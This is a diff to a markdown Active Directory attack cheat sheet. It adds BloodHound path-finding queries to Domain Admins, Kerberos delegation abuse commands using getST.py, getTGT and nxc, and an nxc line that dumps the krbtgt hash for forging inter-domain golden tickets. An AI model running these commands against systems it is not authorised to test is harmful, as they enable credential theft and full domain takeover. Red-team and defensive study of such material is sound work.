@@ -19,6 +19,16 @@ bloodhound-python -c DCOnly -u user01 -p 'password' -d domain.local -ns <DC_IP> 
 ```
 **Reference:** https://github.com/SpecterOps/BloodHound · https://github.com/dirkjanm/BloodHound.py
 
+### Analysis — attack paths from collected data
+After ingesting data in the BloodHound CE GUI, mark compromised principals as **Owned** (right-click → "Mark as Owned") so path queries can start from them, then use:
+- **Built-in queries:** "Shortest Path to Domain Admins", "Shortest Paths from Owned Objects", "Shortest Paths to Unconstrained Delegation Systems", "Find Kerberoastable Users", "Find AS-REP Roastable Users".
+- **Key abusable ACL edges to look for on the path:** `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, `Owns`, `ForceChangePassword`, `AddMember`, `AddSelf`, `ReadGMSAPassword`, `AllowedToDelegate`, `AllowedToAct` (RBCD), `DCSync` (needs both `GetChanges` + `GetChangesAll`).
+- **Example Cypher** — shortest paths from any owned principal to Domain Admins:
+```cypher
+MATCH p=shortestPath((n {owned:true})-[r:MemberOf|GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|ForceChangePassword|AddMember|AllowedToDelegate|AllowedToAct*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}))
+RETURN p
+```
+
 ---
 
 ## 2. Kerberos Delegation Abuse
@@ -26,12 +36,22 @@ bloodhound-python -c DCOnly -u user01 -p 'password' -d domain.local -ns <DC_IP> 
 ### Unconstrained delegation
 Find via BloodHound/`findDelegation.py`. Capture TGTs of anyone authenticating to a compromised unconstrained-delegation host (e.g. via coercion of a DC against that host, then capture with Rubeus/mimikatz on Windows, or monitor via Impacket).
 ```bash
-impacket-findDelegation -u USER -p PASSWORD -d DOMAIN -dc-ip <DC_IP>   # enumerate all delegation types
+impacket-findDelegation -dc-ip <DC_IP> DOMAIN/USER:PASSWORD   # enumerate all delegation types (credentials go in the positional target, no -u/-p/-d flags)
 ```
+**Faster (nxc):** `nxc ldap <dc_ip> -u USER -p PASSWORD --trusted-for-delegation` lists delegation-trusted accounts directly.
 
 ### Constrained delegation with protocol transition (S4U2Self + S4U2Proxy)
 ```bash
 getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/svcaccount:password
+```
+
+### Constrained delegation WITHOUT protocol transition
+Identify which case applies before choosing an approach:
+- **Protocol transition (above)** — `svcaccount`'s `userAccountControl` has `TRUSTED_TO_AUTH_FOR_DELEGATION` set (BloodHound: delegation edge shows "with protocol transition"); `msDS-AllowedToDelegateTo` lists the allowed SPNs. S4U2Self works with just the service account's own credentials, so `-impersonate` succeeds outright.
+- **Without protocol transition** — `msDS-AllowedToDelegateTo` is set but `TRUSTED_TO_AUTH_FOR_DELEGATION` is NOT. S4U2Self is unavailable for arbitrary impersonation; `getST.py -impersonate` will fail unless you already hold the victim's own TGT (S4U2Self via a real TGT still functions, then S4U2Proxy chains from it). In that case, obtain the victim's TGT first (`getTGT.py` with their creds/hash, or extract via mimikatz), then request the referral service ticket:
+```bash
+getTGT.py domain.local/victimuser:password
+KRB5CCNAME=victimuser.ccache getST.py -spn cifs/target.domain.local -impersonate victimuser domain.local/svcaccount:password
 ```
 
 ### RBCD (Resource-Based Constrained Delegation)
@@ -60,6 +80,7 @@ Two paths to cross a parent/child or forest trust boundary once you own a DC on 
 ```bash
 # Dump krbtgt hash of the child domain
 secretsdump.py child.domain.local/Administrator:password@CHILD_DC_IP -just-dc-user krbtgt
+# Faster (nxc): nxc smb CHILD_DC_IP -u Administrator -p password --ntds --user krbtgt   # pulls just the krbtgt hash via DRSUAPI
 
 # Forge a TGT injecting the parent's Enterprise Admins SID
 ticketer.py -nthash <krbtgt_NTHASH> -domain-sid <CHILD_DOMAIN_SID> -domain child.domain.local -extra-sid <PARENT_DOMAIN_SID>-519 Administrator
